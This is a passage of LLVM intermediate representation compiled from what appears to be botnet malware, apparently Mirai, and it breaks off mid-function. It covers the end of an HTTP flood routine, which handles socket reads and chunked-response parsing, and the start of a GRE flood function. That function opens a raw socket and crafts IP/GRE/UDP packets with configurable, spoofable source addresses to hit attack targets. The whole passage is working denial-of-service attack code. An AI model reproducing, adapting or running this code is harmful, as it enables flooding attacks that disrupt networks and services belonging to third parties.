  %2282 = getelementptr inbounds [128 x i8], [128 x i8]* %2281, i32 0, i32 0
  %2283 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2284 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2283, i32 0, i32 16
  %2285 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2285, i32 0, i32 15
  %2287 = load i32, i32* %2286, align 4
  %2288 = sext i32 %2287 to i64
  %2289 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2284, i64 0, i64 %2288
  %2290 = getelementptr inbounds [128 x i8], [128 x i8]* %2289, i32 0, i32 0
  %2291 = call i32 @util_strlen(i8* %2290)
  %2292 = sext i32 %2291 to i64
  %2293 = getelementptr inbounds i8, i8* %2282, i64 %2292
  %2294 = call i32 @util_strcpy(i8* %2293, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2295 = load i32, i32* %61, align 4
  %2296 = add nsw i32 %2295, 3
  %2297 = load i32, i32* %60, align 4
  %2298 = add nsw i32 %2297, %2296
  store i32 %2298, i32* %60, align 4
  %2299 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2299, i32 0, i32 18
  %2301 = load i32, i32* %60, align 4
  %2302 = sext i32 %2301 to i64
  %2303 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2300, i64 0, i64 %2302
  %2304 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2304, i32 0, i32 17
  %2306 = load i32, i32* %2305, align 4
  %2307 = load i32, i32* %60, align 4
  %2308 = sub nsw i32 %2306, %2307
  %2309 = call i32 @util_memsearch(i8* %2303, i32 %2308, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2309, i32* %61, align 4
  %2310 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2311 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2310, i32 0, i32 18
  %2312 = load i32, i32* %60, align 4
  %2313 = load i32, i32* %61, align 4
  %2314 = sub nsw i32 %2313, 1
  %2315 = add nsw i32 %2312, %2314
  %2316 = sext i32 %2315 to i64
  %2317 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2311, i64 0, i64 %2316
  store i8 0, i8* %2317, align 1
  %2318 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2318, i32 0, i32 16
  %2320 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2320, i32 0, i32 15
  %2322 = load i32, i32* %2321, align 4
  %2323 = sext i32 %2322 to i64
  %2324 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2319, i64 0, i64 %2323
  %2325 = getelementptr inbounds [128 x i8], [128 x i8]* %2324, i32 0, i32 0
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 16
  %2328 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2329 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2328, i32 0, i32 15
  %2330 = load i32, i32* %2329, align 4
  %2331 = sext i32 %2330 to i64
  %2332 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2327, i64 0, i64 %2331
  %2333 = getelementptr inbounds [128 x i8], [128 x i8]* %2332, i32 0, i32 0
  %2334 = call i32 @util_strlen(i8* %2333)
  %2335 = sext i32 %2334 to i64
  %2336 = getelementptr inbounds i8, i8* %2325, i64 %2335
  %2337 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2338 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2337, i32 0, i32 18
  %2339 = load i32, i32* %60, align 4
  %2340 = sext i32 %2339 to i64
  %2341 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2338, i64 0, i64 %2340
  %2342 = call i32 @util_strcpy(i8* %2336, i8* %2341)
  %2343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2343, i32 0, i32 15
  %2345 = load i32, i32* %2344, align 4
  %2346 = add nsw i32 %2345, 1
  store i32 %2346, i32* %2344, align 4
  br label %2347

; <label>:2347:                                   ; preds = %2260, %2252, %2220
  %2348 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2348, i32 0, i32 14
  store i32 -1, i32* %2349, align 4
  %2350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2350, i32 0, i32 1
  store i8 10, i8* %2351, align 4
  br label %2474

; <label>:2352:                                   ; preds = %2210
  br label %2353

; <label>:2353:                                   ; preds = %2352, %2199
  br label %2354

; <label>:2354:                                   ; preds = %2353, %2178
  %2355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2355, i32 0, i32 14
  %2357 = load i32, i32* %2356, align 4
  %2358 = icmp eq i32 %2357, 0
  br i1 %2358, label %2359, label %2437

; <label>:2359:                                   ; preds = %2354
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 13
  %2362 = load i32, i32* %2361, align 4
  %2363 = icmp eq i32 %2362, 1
  br i1 %2363, label %2364, label %2420

; <label>:2364:                                   ; preds = %2359
  %2365 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2365, i32 0, i32 18
  %2367 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2366, i32 0, i32 0
  %2368 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2368, i32 0, i32 17
  %2370 = load i32, i32* %2369, align 4
  %2371 = call i32 @util_memsearch(i8* %2367, i32 %2370, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2372 = icmp ne i32 %2371, -1
  br i1 %2372, label %2373, label %2419

; <label>:2373:                                   ; preds = %2364
  %2374 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2375 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2374, i32 0, i32 18
  %2376 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2375, i32 0, i32 0
  %2377 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2377, i32 0, i32 17
  %2379 = load i32, i32* %2378, align 4
  %2380 = call i32 @util_memsearch(i8* %2376, i32 %2379, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2380, i32* %62, align 4
  %2381 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2381, i32 0, i32 18
  %2383 = load i32, i32* %62, align 4
  %2384 = sub nsw i32 %2383, 2
  %2385 = sext i32 %2384 to i64
  %2386 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2382, i64 0, i64 %2385
  store i8 0, i8* %2386, align 1
  %2387 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2387, i32 0, i32 18
  %2389 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2388, i32 0, i32 0
  %2390 = load i32, i32* %62, align 4
  %2391 = call i32 @util_memsearch(i8* %2389, i32 %2390, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2392 = icmp ne i32 %2391, -1
  br i1 %2392, label %2393, label %2403

; <label>:2393:                                   ; preds = %2373
  %2394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2394, i32 0, i32 18
  %2396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2396, i32 0, i32 18
  %2398 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2397, i32 0, i32 0
  %2399 = load i32, i32* %62, align 4
  %2400 = call i32 @util_memsearch(i8* %2398, i32 %2399, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2401 = sext i32 %2400 to i64
  %2402 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2395, i64 0, i64 %2401
  store i8 0, i8* %2402, align 1
  br label %2403

; <label>:2403:                                   ; preds = %2393, %2373
  %2404 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2404, i32 0, i32 18
  %2406 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2405, i32 0, i32 0
  %2407 = call i32 @util_atoi(i8* %2406, i32 16)
  store i32 %2407, i32* %63, align 4
  %2408 = load i32, i32* %63, align 4
  %2409 = icmp eq i32 %2408, 0
  br i1 %2409, label %2410, label %2413

; <label>:2410:                                   ; preds = %2403
  %2411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2411, i32 0, i32 1
  store i8 1, i8* %2412, align 4
  br label %2474

; <label>:2413:                                   ; preds = %2403
  %2414 = load i32, i32* %63, align 4
  %2415 = add nsw i32 %2414, 2
  %2416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2416, i32 0, i32 14
  store i32 %2415, i32* %2417, align 4
  %2418 = load i32, i32* %62, align 4
  store i32 %2418, i32* %59, align 4
  br label %2419

; <label>:2419:                                   ; preds = %2413, %2364
  br label %2436

; <label>:2420:                                   ; preds = %2359
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 17
  %2423 = load i32, i32* %2422, align 4
  %2424 = load i32, i32* %59, align 4
  %2425 = sub nsw i32 %2423, %2424
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 14
  store i32 %2425, i32* %2427, align 4
  %2428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2428, i32 0, i32 14
  %2430 = load i32, i32* %2429, align 4
  %2431 = icmp eq i32 %2430, 0
  br i1 %2431, label %2432, label %2435

; <label>:2432:                                   ; preds = %2420
  %2433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2433, i32 0, i32 1
  store i8 1, i8* %2434, align 4
  br label %2474

; <label>:2435:                                   ; preds = %2420
  br label %2436

; <label>:2436:                                   ; preds = %2435, %2419
  br label %2437

; <label>:2437:                                   ; preds = %2436, %2354
  %2438 = load i32, i32* %59, align 4
  %2439 = icmp eq i32 %2438, 0
  br i1 %2439, label %2440, label %2441

; <label>:2440:                                   ; preds = %2437
  br label %2474

; <label>:2441:                                   ; preds = %2437
  %2442 = load i32, i32* %59, align 4
  %2443 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2443, i32 0, i32 17
  %2445 = load i32, i32* %2444, align 4
  %2446 = sub nsw i32 %2445, %2442
  store i32 %2446, i32* %2444, align 4
  %2447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2447, i32 0, i32 18
  %2449 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2448, i32 0, i32 0
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 18
  %2452 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2451, i32 0, i32 0
  %2453 = load i32, i32* %59, align 4
  %2454 = sext i32 %2453 to i64
  %2455 = getelementptr inbounds i8, i8* %2452, i64 %2454
  %2456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2456, i32 0, i32 17
  %2458 = load i32, i32* %2457, align 4
  %2459 = sext i32 %2458 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2449, i8* %2455, i64 %2459, i32 1, i1 false)
  %2460 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2460, i32 0, i32 18
  %2462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2462, i32 0, i32 17
  %2464 = load i32, i32* %2463, align 4
  %2465 = sext i32 %2464 to i64
  %2466 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2461, i64 0, i64 %2465
  store i8 0, i8* %2466, align 1
  %2467 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2468 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2467, i32 0, i32 17
  %2469 = load i32, i32* %2468, align 4
  %2470 = icmp eq i32 %2469, 0
  br i1 %2470, label %2471, label %2472

; <label>:2471:                                   ; preds = %2441
  br label %2474

; <label>:2472:                                   ; preds = %2441
  br label %2473

; <label>:2473:                                   ; preds = %2472
  br label %2178

; <label>:2474:                                   ; preds = %2471, %2440, %2432, %2410, %2347
  br label %2100

; <label>:2475:                                   ; preds = %2168, %2106
  br label %2528

; <label>:2476:                                   ; preds = %2093
  %2477 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2477, i32 0, i32 1
  %2479 = load i8, i8* %2478, align 4
  %2480 = zext i8 %2479 to i32
  %2481 = icmp eq i32 %2480, 10
  br i1 %2481, label %2482, label %2527

; <label>:2482:                                   ; preds = %2476
  br label %2483

; <label>:2483:                                   ; preds = %2516, %2482
  %2484 = call i32* @__errno_location() #7
  store i32 0, i32* %2484, align 4
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 0
  %2487 = load i32, i32* %2486, align 4
  %2488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2489 = call i64 @recv(i32 %2487, i8* %2488, i64 10240, i32 16384)
  %2490 = trunc i64 %2489 to i32
  store i32 %2490, i32* %12, align 4
  %2491 = load i32, i32* %12, align 4
  %2492 = icmp eq i32 %2491, 0
  br i1 %2492, label %2493, label %2495

; <label>:2493:                                   ; preds = %2483
  %2494 = call i32* @__errno_location() #7
  store i32 104, i32* %2494, align 4
  store i32 -1, i32* %12, align 4
  br label %2495

; <label>:2495:                                   ; preds = %2493, %2483
  %2496 = load i32, i32* %12, align 4
  %2497 = icmp eq i32 %2496, -1
  br i1 %2497, label %2498, label %2516

; <label>:2498:                                   ; preds = %2495
  %2499 = call i32* @__errno_location() #7
  %2500 = load i32, i32* %2499, align 4
  %2501 = icmp ne i32 %2500, 11
  br i1 %2501, label %2502, label %2515

; <label>:2502:                                   ; preds = %2498
  %2503 = call i32* @__errno_location() #7
  %2504 = load i32, i32* %2503, align 4
  %2505 = icmp ne i32 %2504, 11
  br i1 %2505, label %2506, label %2515

; <label>:2506:                                   ; preds = %2502
  %2507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2507, i32 0, i32 0
  %2509 = load i32, i32* %2508, align 4
  %2510 = call i32 @close(i32 %2509)
  %2511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2511, i32 0, i32 0
  store i32 -1, i32* %2512, align 4
  %2513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2513, i32 0, i32 1
  store i8 0, i8* %2514, align 4
  br label %2515

; <label>:2515:                                   ; preds = %2506, %2502, %2498
  br label %2517

; <label>:2516:                                   ; preds = %2495
  br label %2483

; <label>:2517:                                   ; preds = %2515
  %2518 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2518, i32 0, i32 1
  %2520 = load i8, i8* %2519, align 4
  %2521 = zext i8 %2520 to i32
  %2522 = icmp ne i32 %2521, 0
  br i1 %2522, label %2523, label %2526

; <label>:2523:                                   ; preds = %2517
  %2524 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2525 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2524, i32 0, i32 1
  store i8 1, i8* %2525, align 4
  br label %2526

; <label>:2526:                                   ; preds = %2523, %2517
  br label %2527

; <label>:2527:                                   ; preds = %2526, %2476
  br label %2528

; <label>:2528:                                   ; preds = %2527, %2475
  br label %2529

; <label>:2529:                                   ; preds = %2528, %2084
  br label %2530

; <label>:2530:                                   ; preds = %2529, %1107
  br label %2531

; <label>:2531:                                   ; preds = %2530, %2044, %1713, %1156, %1139, %1097, %1065
  %2532 = load i32, i32* %9, align 4
  %2533 = add nsw i32 %2532, 1
  store i32 %2533, i32* %9, align 4
  br label %1052

; <label>:2534:                                   ; preds = %1052
  br label %440

; <label>:2535:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %433

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %433

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %238, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %241

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, 15
  %118 = or i8 %117, 64
  store i8 %118, i8* %115, align 4
  %119 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %120 = bitcast %struct.iphdr* %119 to i8*
  %121 = load i8, i8* %120, align 4
  %122 = and i8 %121, -16
  %123 = or i8 %122, 5
  store i8 %123, i8* %120, align 4
  %124 = load i8, i8* %12, align 1
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 1
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = add i64 52, %128
  %130 = trunc i64 %129 to i16
  %131 = call zeroext i16 @htons(i16 zeroext %130) #7
  %132 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 2
  store i16 %131, i16* %133, align 2
  %134 = load i16, i16* %13, align 2
  %135 = call zeroext i16 @htons(i16 zeroext %134) #7
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 3
  store i16 %135, i16* %137, align 4
  %138 = load i8, i8* %14, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 5
  store i8 %138, i8* %140, align 4
  %141 = load i8, i8* %15, align 1
  %142 = icmp ne i8 %141, 0
  br i1 %142, label %143, label %147

; <label>:143:                                    ; preds = %93
  %144 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 4
  store i16 %144, i16* %146, align 2
  br label %147

; <label>:147:                                    ; preds = %143, %93
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 6
  store i8 47, i8* %149, align 1
  %150 = load i32, i32* %21, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 8
  store i32 %150, i32* %152, align 4
  %153 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i64 %155
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
